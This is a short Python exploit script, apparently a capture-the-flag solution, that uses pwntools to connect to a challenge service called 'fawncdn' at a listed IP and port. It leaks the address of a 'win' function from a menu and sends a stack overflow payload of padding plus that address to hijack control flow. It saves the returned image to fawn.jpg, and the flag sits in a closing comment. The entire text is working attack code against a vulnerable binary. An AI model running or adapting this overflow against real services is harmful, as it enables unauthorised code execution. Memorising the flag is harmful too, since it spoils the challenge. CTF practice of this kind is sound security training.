#!/usr/bin/env python3
import pwn

host = "35.224.135.84"
port = 1001
target = "fawncdn-a3cd1758f2755c61a18f59a10dd6d1ab"

def list_file(pr):
    pr.sendlineafter('cmd> ', str(1))
    line = pr.readuntil('at ')
    addr = pr.readline().strip().split(b'"')[0]
    return int(addr, 16)

def delivery_file(pr, payload):
    payload = str(3).encode() + payload
    pr.sendlineafter('cmd> ', payload)

def exploit(remote=False):
    if remote:
        pr = pwn.connect(host, port)
    else:
        pr = pwn.process(target)

    try:
        win = list_file(pr)
        payload = b'A'*15 + pwn.p64(win)
        delivery_file(pr, payload)
        img = pr.readuntil('\n1')
        with open('fawn.jpg', 'wb') as fd:
            fd.write(img)
    finally:
        pr.close()


exploit(True)
# CCC{th3y_w3r3nt_ly1ng_th1s_CDN_c4n_d3l1v3r}
